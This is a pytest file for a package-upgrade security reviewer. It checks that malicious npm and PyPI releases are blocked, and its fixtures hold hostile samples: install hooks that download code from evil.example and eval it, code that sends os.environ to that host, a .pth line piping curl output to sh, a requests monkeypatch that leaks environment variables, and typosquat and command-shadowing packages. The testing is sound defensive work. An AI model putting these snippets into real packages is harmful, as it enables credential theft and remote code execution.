from __future__ import annotations

import base64
import hashlib
import json
import zipfile

from tests.test_package_code_analyzer import _analyze_archive, _write_npm_tgz
from tests.test_upgrade_review import NPM, _kinds, _one, registry
from tests.test_upgrade_review_bypasses import pypi_wheels

from ca9 import api

__all__ = ["registry"]


DOWNLOAD_THEN = (
    "const https = require('https');\n"
    "https.get('https://evil.example/p', (r) => {{\n"
    "  let d = '';\n"
    "  r.on('data', (c) => (d += c));\n"
    "  r.on('end', () => {{ {sink}; }});\n"
    "}});\n"
)


BINARY_DOWNLOAD = (
    "const https = require('https');\nconst fs = require('fs');\n"
    "https.get('https://github.com/o/r/releases/download/v{version}/bin', (r) =>\n"
    "  r.pipe(fs.createWriteStream('bin')).on('finish', () => fs.chmodSync('bin', 0o755)));\n"
)


def _hooked(registry, name, old_js, new_js):
    for version, body in (("1.0.0", old_js), ("1.0.1", new_js)):
        registry.npm(
            name,
            version,
            {"index.js": "module.exports = 1;\n", "install.js": body},
            manifest={"scripts": {"postinstall": "node install.js"}},
        )
    return _one("npm", name, "1.0.0", "1.0.1")[0]


def test_install_script_that_starts_running_a_download_blocks(registry):
    sinks = [
        "eval(d)",
        "new Function(d)()",
        "Function(d)()",
        "require('vm').runInThisContext(d)",
        "const vm = require('vm'); new vm.Script(d).runInThisContext()",
        "module._compile(d, 'x.js')",
    ]
    for index, sink in enumerate(sinks):
        new_js = DOWNLOAD_THEN.format(sink=sink)
        result = _hooked(registry, f"hooked{index}", "console.log('ready');\n", new_js)
        assert "new_install_hook" in _kinds(result, "block"), sink


def test_install_script_that_starts_running_its_downloaded_binary_blocks(registry):
    old_js = BINARY_DOWNLOAD.format(version="1.0.0")
    new_js = BINARY_DOWNLOAD.format(version="1.0.1") + (
        "require('child_process').execFileSync('./bin', ['--version']);\n"
    )

    result = _hooked(registry, "binfetch", old_js, new_js)

    assert "new_install_hook" in _kinds(result, "block")


def test_install_scripts_that_keep_their_download_shape_or_only_parse_json_stay_quiet(registry):
    same_shape = _hooked(
        registry,
        "binsame",
        BINARY_DOWNLOAD.format(version="1.0.0"),
        BINARY_DOWNLOAD.format(version="1.0.1"),
    )
    runs_in_both = _hooked(
        registry,
        "binboth",
        BINARY_DOWNLOAD.format(version="1.0.0")
        + "require('child_process').execFileSync('./bin');\n",
        BINARY_DOWNLOAD.format(version="1.0.1")
        + "require('child_process').execFileSync('./bin');\n",
    )
    parses_json = _hooked(
        registry,
        "jsonfetch",
        "console.log('ready');\n",
        DOWNLOAD_THEN.format(
            sink="require('fs').writeFileSync('meta.json', JSON.stringify(JSON.parse(d)))"
        ),
    )

    assert same_shape["block"] == [] and same_shape["warn"] == []
    assert runs_in_both["block"] == []
    assert parses_json["block"] == []


def _js_upgrade(registry, name, files, extra=None):
    registry.npm(name, "1.0.0", {"index.js": "module.exports = (a) => a + 1;\n"})
    registry.npm(name, "1.0.1", {**files, **(extra or {})})
    return _one("npm", name, "1.0.0", "1.0.1")[0]


def test_template_literal_requires_and_get_builtin_module_are_capabilities(registry):
    cases = {
        "tl-require": ("const cp = require(`child_process`);\ncp.exec('id');\n", "exec"),
        "tl-import": ("import(`node:child_process`).then((m) => m.exec('id'));\n", "exec"),
        "builtin": ("process.getBuiltinModule('child_process').execSync('id');\n", "exec"),
        "builtin-tl": (
            "globalThis.process.getBuiltinModule(`node:https`).get('https://evil.example');\n",
            "network",
        ),
        "builtin-index": (
            "process['getBuiltinModule']('child_process').execSync('id');\n",
            "exec",
        ),
    }
    for name, (code, capability) in cases.items():
        result = _js_upgrade(registry, name, {"index.js": code})
        assert f"new_import_time_{capability}" in _kinds(result, "warn"), name

    relative = _js_upgrade(
        registry,
        "tl-relative",
        {"index.js": "module.exports = require(`./lib/x`);\n"},
        {"lib/x.js": "require('child_process').exec('id');\n"},
    )
    assert [delta["path"] for delta in relative["warn"]] == ["lib/x.js"]


def test_template_literals_that_are_not_module_loads_stay_quiet(registry):
    quiet = _js_upgrade(
        registry,
        "tl-quiet",
        {
            "index.js": (
                "const note = `child_process is not used`;\n"
                "const plugin = (name) => require(`./plugins/${name}`);\n"
                "const fs = globalThis.process.getBuiltinModule('fs');\n"
                "module.exports = { note, plugin, fs };\n"
            )
        },
    )

    assert quiet["block"] == [] and quiet["warn"] == []


def test_package_code_credential_rule_sees_template_literal_and_builtin_loads(tmp_path):
    loads = ("require(`https`)", "process.getBuiltinModule('node:https')")
    for index, load in enumerate(loads):
        tgz = tmp_path / f"bad{index}-1.0.0.tgz"
        _write_npm_tgz(
            tgz,
            {
                "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
                "package/index.js": (
                    "const t = JSON.stringify(process.env);\n"
                    f"{load}.request('https://example.invalid', () => {{}}).end(t);\n"
                ),
            },
        )
        findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")
        assert any(f.signal_type == "npm-credential-exfiltration" for f in findings), load


def _py_upgrade(registry, name, files):
    registry.pypi(name, "1.0", wheel={f"{name}/__init__.py": "VALUE = 1\n"})
    registry.pypi(name, "1.1", wheel=files)
    return _one("pypi", name, "1.0", "1.1")[0]


def test_python_client_objects_and_import_module_chains_are_import_time_behaviour(registry):
    network = {
        "httpc": (
            "import http.client, json, os\n"
            "c = http.client.HTTPSConnection('evil.example')\n"
            "c.request('POST', '/c', body=json.dumps(dict(os.environ)))\n"
        ),
        "sess": (
            "import os, requests\n"
            "requests.Session().post('https://evil.example/c', data=dict(os.environ))\n"
        ),
        "withsess": (
            "import requests\nwith requests.Session() as s:\n    s.get('https://evil.example/c')\n"
        ),
        "pool": (
            "import urllib3\nhttp = urllib3.PoolManager()\nhttp.request('GET', 'https://evil.example')\n"
        ),
    }
    for name, code in network.items():
        result = _py_upgrade(registry, name, {f"{name}/__init__.py": code})
        assert "new_import_time_network" in _kinds(result, "block"), name

    boot = "import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\n"
    loaders = {
        "dyn": "import importlib\nimportlib.import_module('dyn._boot')\n",
        "dynrel": "import importlib\nimportlib.import_module('._boot', __name__)\n",
        "dynkw": "import importlib\nimportlib.import_module('._boot', package='dynkw')\n",
        "dunder": "__import__('dunder._boot')\n",
        "fromimp": "from importlib import import_module\nimport_module('fromimp._boot')\n",
    }
    for name, code in loaders.items():
        result = _py_upgrade(
            registry, name, {f"{name}/__init__.py": code, f"{name}/_boot.py": boot}
        )
        exec_paths = [d["path"] for d in result["block"] if d["kind"] == "new_import_time_exec"]
        assert exec_paths == [f"{name}/_boot.py"], name


def test_clients_built_but_not_used_at_import_time_stay_quiet(registry):
    result = _py_upgrade(
        registry,
        "lazy",
        {
            "lazy/__init__.py": (
                "import http.client, importlib, requests\n"
                "session = requests.Session()\n"
                "conn = http.client.HTTPSConnection('api.example')\n"
                "json_module = importlib.import_module('json')\n"
                "def fetch(url):\n    return session.get(url)\n"
                "def load(name):\n    return importlib.import_module('lazy._boot')\n"
            ),
            "lazy/_boot.py": "import subprocess\nsubprocess.Popen(['id'])\n",
        },
    )

    assert result["block"] == [] and result["warn"] == []


def test_pth_lines_are_read_the_way_old_and_new_pythons_split_them(registry):
    payload = "os.system('curl -s https://evil.example/p | sh')"
    variants = {
        "ff": f"import os\x0c;{payload}\n",
        "vt": f"import os\x0b;{payload}\n",
        "fs": f"import os\x1c;{payload}\n",
        "nel": f"import os\x85;{payload}\n",
        "ls": f"import os\u2028;{payload}\n",
        "late": f"# note\x1cimport os;{payload}\n",
    }
    for name, line in variants.items():
        result = _py_upgrade(
            registry, name, {f"{name}/__init__.py": "VALUE = 1\n", f"{name}_init.pth": line}
        )
        assert _kinds(result, "block") == ["new_pth_code"], name


def test_unchanged_pth_with_a_form_feed_is_not_new(registry):
    line = "import os\x0c;os.environ.setdefault('X', '1')\n"
    files = {"demo/__init__.py": "VALUE = 1\n", "demo_init.pth": line}
    registry.pypi("demo", "1.0", wheel=files)
    registry.pypi("demo", "1.1", wheel={**files, "demo/__init__.py": "VALUE = 2\n"})

    result, _ = _one("pypi", "demo", "1.0", "1.1")

    assert result["block"] == [] and result["warn"] == []


def test_package_code_scan_reads_form_feed_pth_lines(tmp_path):
    for index, separator in enumerate(("\x0c", "\x1c", "\u2028")):
        wheel = tmp_path / f"bad{index}-1.0.0-py3-none-any.whl"
        with zipfile.ZipFile(wheel, "w") as archive:
            archive.writestr("bad.pth", f"import os{separator};os.system('id')\n")

        findings = _analyze_archive(tmp_path, wheel)

        assert [finding.signal_type for finding in findings] == ["python-startup-pth-exec"]


def test_payload_only_in_another_platforms_wheel_blocks(registry):
    clean = {"plat/__init__.py": "X = 1\n"}
    pypi_wheels(registry, "plat", "1.0", [("py3-none-any", clean)])
    pypi_wheels(
        registry,
        "plat",
        "1.1",
        [
            ("py3-none-any", clean),
            ("py3-none-win_amd64", {**clean, "sitecustomize.py": "import os\nos.system('calc')\n"}),
        ],
    )

    result, receipt = _one("pypi", "plat", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_import_time_exec", "new_sitecustomize"]
    assert all("plat-1.1-py3-none-win_amd64.whl" in delta["detail"] for delta in result["block"])
    reviewed = [item["new"]["filename"] for item in result["artifacts"].get("also", [])]
    assert "plat-1.1-py3-none-win_amd64.whl" in reviewed
    assert result["complete"] is True
    assert receipt["complete"] is True


def test_first_release_reviews_every_wheel(registry):
    clean = {"fresh/__init__.py": "X = 1\n"}
    pypi_wheels(
        registry,
        "fresh",
        "1.0",
        [
            ("py3-none-any", clean),
            ("py3-none-win_amd64", {**clean, "fresh.pth": "import os; os.system('id')\n"}),
        ],
    )

    report = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "fresh", "old": None, "new": "1.0"}]
    )

    assert _kinds(report["results"][0], "block") == ["new_pth_code"]


def test_wheels_beyond_the_budget_make_the_result_incomplete(registry):
    clean = {"plat/__init__.py": "X = 1\n"}
    pypi_wheels(registry, "plat", "1.0", [("py3-none-any", clean)])
    pypi_wheels(
        registry,
        "plat",
        "1.1",
        [
            (tag, {**clean, "plat/_tag.txt": tag})
            for tag in ("py3-none-any", "py3-none-win_amd64", "py3-none-win32")
        ],
    )

    report = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "plat", "old": "1.0", "new": "1.1"}],
        options={"max_release_mb": 0.0001},
    )
    result = report["results"][0]

    assert result["complete"] is False
    unseen = [item for item in result["limitations"] if "other file(s)" in item]
    assert unseen and "plat-1.1-py3-none-win_amd64.whl (over max_release_mb)" in unseen[0]
    uncommon = [item for item in result["limitations"] if "uncommon platforms" in item]
    assert uncommon and "plat-1.1-py3-none-win32.whl" in uncommon[0]
    assert "not reviewed" in uncommon[0]
    assert report["receipt"]["complete"] is False


def test_platform_wheels_with_the_same_code_stay_quiet_and_complete(registry):
    clean = {"plat/__init__.py": "X = 1\n"}
    wheels = [
        ("py3-none-any", clean),
        ("cp312-cp312-win_amd64", {**clean, "plat/_core.pyd": b"MZ" + b"\x00" * 600}),
        (
            "cp312-cp312-macosx_11_0_arm64",
            {**clean, "plat/_core.so": b"\xcf\xfa\xed\xfe" + b"\x00" * 64},
        ),
    ]
    pypi_wheels(registry, "plat", "1.0", wheels)
    pypi_wheels(registry, "plat", "1.1", [(tag, {**files}) for tag, files in wheels])

    result, receipt = _one("pypi", "plat", "1.0", "1.1")

    assert result["block"] == [] and result["warn"] == []
    assert result["complete"] is True and receipt["complete"] is True


def test_same_version_lockfile_swap_is_checked_against_the_registry(registry):
    registry.npm("lodash", "4.17.21", {"index.js": "module.exports = 1;\n"})
    other = "sha512-" + base64.b64encode(hashlib.sha512(b"evilpkg").digest()).decode()
    pair = {
        "ecosystem": "npm",
        "name": "lodash",
        "old": "4.17.21",
        "new": "4.17.21",
        "integrity": other,
        "resolved": f"{NPM}/evilpkg/-/evilpkg-1.0.0.tgz",
    }

    report = api.review_upgrades([pair])
    result = report["results"][0]

    assert result["status"] == "reviewed"
    assert _kinds(result, "block") == ["lockfile_artifact_mismatch"]
    assert report["receipt"]["pairs_with_block"] == 1


def test_same_version_lockfile_checks_without_a_match_or_digest(registry):
    url = registry.npm("lodash", "4.17.21", {"index.js": "module.exports = 1;\n"})
    served = json.loads(registry.documents[f"{NPM}/lodash/4.17.21"])["dist"]["integrity"]
    base = {"ecosystem": "npm", "name": "lodash", "old": "4.17.21", "new": "4.17.21"}

    matching = api.review_upgrades([{**base, "integrity": served, "resolved": url}])
    unpinned = api.review_upgrades([{**base, "resolved": f"{NPM}/evilpkg/-/evilpkg-1.0.0.tgz"}])
    plain = api.review_upgrades([base])
    registry.npm("lodash", "4.17.20", {"index.js": "module.exports = 1;\n"})
    upgrade = {**base, "old": "4.17.20"}
    unserved = api.review_upgrades([{**upgrade, "resolved": f"{NPM}/evilpkg/-/evilpkg-1.0.0.tgz"}])
    served_url = api.review_upgrades(
        [{**upgrade, "resolved": url.replace("npmjs.org", "yarnpkg.com")}]
    )

    assert unserved["results"][0]["complete"] is False
    assert served_url["results"][0]["complete"] is True
    assert matching["results"][0]["status"] == "reviewed"
    assert matching["results"][0]["block"] == []
    assert matching["receipt"]["complete"] is True
    assert unpinned["results"][0]["complete"] is False
    assert unpinned["receipt"]["complete"] is False
    assert plain["results"][0]["reason"] == "same_version"
    assert plain["receipt"]["complete"] is True
    assert all("evilpkg" not in url for url in registry.requests if url.endswith(".tgz"))


def test_wheel_that_adds_another_distributions_top_level_package_blocks(registry):
    patch = (
        "import os, requests.sessions as s\n"
        "_send = s.Session.send\n"
        "def send(self, r, **kw):\n"
        "    r.headers['x'] = repr(dict(os.environ))\n"
        "    return _send(self, r, **kw)\n"
        "s.Session.send = send\n"
    )
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "VALUE = 1\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            "demo/__init__.py": "VALUE = 1\n",
            "requests/__init__.py": patch,
            "six.py": "X = 1\n",
        },
    )
    registry.pypi("reqeusts", "1.0", wheel={"requests/__init__.py": patch})
    registry.pypi(
        "helper",
        "1.0",
        wheel={
            "helper/__init__.py": "X = 1\n",
            "urllib3/__init__.py": "X = 1\n",
            "helper-1.0.dist-info/METADATA": (
                "Metadata-Version: 2.1\nName: helper\nVersion: 1.0\nRequires-Dist: urllib3>=2\n"
            ),
        },
    )

    upgrade, _ = _one("pypi", "demo", "1.0", "1.1")
    typosquat = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "reqeusts", "old": None, "new": "1.0"}]
    )
    overwrites_dependency = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "helper", "old": None, "new": "1.0"}]
    )

    collisions = sorted(
        d["path"] for d in upgrade["block"] if d["kind"] == "ambiguous_package_contents"
    )
    assert collisions == ["requests/__init__.py", "six.py"]
    assert _kinds(typosquat["results"][0], "block") == ["ambiguous_package_contents"]
    assert _kinds(overwrites_dependency["results"][0], "block") == ["ambiguous_package_contents"]


def test_own_top_level_packages_and_unrelated_names_in_first_releases_stay_quiet(registry):
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "VALUE = 1\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            "demo/__init__.py": "VALUE = 1\n",
            "demo/extra.py": "X = 1\n",
            "demo_helpers/__init__.py": "X = 1\n",
            "tests/__init__.py": "",
        },
    )
    registry.pypi("beautifulsoup4", "4.12.3", wheel={"bs4/__init__.py": "X = 1\n"})
    registry.pypi("pyyaml", "6.0", wheel={"yaml/__init__.py": "X = 1\n", "_yaml/__init__.py": ""})

    upgrade, _ = _one("pypi", "demo", "1.0", "1.1")
    first = api.review_upgrades(
        [
            {"ecosystem": "pypi", "name": "beautifulsoup4", "old": None, "new": "4.12.3"},
            {"ecosystem": "pypi", "name": "pyyaml", "old": None, "new": "6.0"},
        ]
    )

    assert upgrade["block"] == [] and upgrade["warn"] == []
    assert [item["block"] for item in first["results"]] == [[], []]


def test_new_binaries_named_like_developer_tools_shadow_them(registry):
    commands = ["yarn", "pnpm", "bun", "tsc", "ssh", "wget", "gh", "make", "docker"]
    registry.npm("sample", "1.0.0", {"index.js": "1;\n"})
    registry.npm(
        "sample",
        "1.0.1",
        {"index.js": "1;\n", "cli.js": "1;\n"},
        manifest={"bin": {command: "cli.js" for command in commands}},
    )
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "X = 1\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            "demo/__init__.py": "X = 1\n",
            "demo-1.1.dist-info/entry_points.txt": "[console_scripts]\ndocker = demo:main\n",
        },
    )

    npm_result, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    pypi_result, _ = _one("pypi", "demo", "1.0", "1.1")

    shadowed = sorted(delta["snippet"] for delta in npm_result["block"])
    assert shadowed == sorted(commands)
    assert _kinds(pypi_result, "block") == ["shadows_system_command"]


def test_tools_that_ship_their_own_command_do_not_shadow_it(registry):
    registry.npm(
        "typescript",
        "5.6.3",
        {"lib/tsc.js": "1;\n", "lib/tsserver.js": "1;\n"},
        manifest={
            "bin": {"tsc": "lib/tsc.js", "tsserver": "lib/tsserver.js"},
            "main": "lib/tsc.js",
        },
    )
    registry.npm(
        "pnpm",
        "9.12.0",
        {"bin/pnpm.cjs": "1;\n"},
        manifest={"bin": {"pnpm": "bin/pnpm.cjs", "pnpx": "bin/pnpm.cjs"}},
    )

    report = api.review_upgrades(
        [
            {"ecosystem": "npm", "name": "typescript", "old": None, "new": "5.6.3"},
            {"ecosystem": "npm", "name": "pnpm", "old": None, "new": "9.12.0"},
        ]
    )

    assert [result["block"] for result in report["results"]] == [[], []]


def test_generated_compiler_helper_modules_are_not_collisions(registry):
    helper = "c0ffee1234567890abcd__mypyc"
    registry.pypi("compiled", "1.0", wheel={"compiled/__init__.py": "X = 1\n"})
    registry.pypi(
        "compiled",
        "1.1",
        wheel={
            "compiled/__init__.py": "X = 1\n",
            f"{helper}.cpython-314-darwin.so": b"\x7fELF\x02" + b"\x00" * 64,
        },
    )

    result, _ = _one("pypi", "compiled", "1.0", "1.1")

    assert result["block"] == []
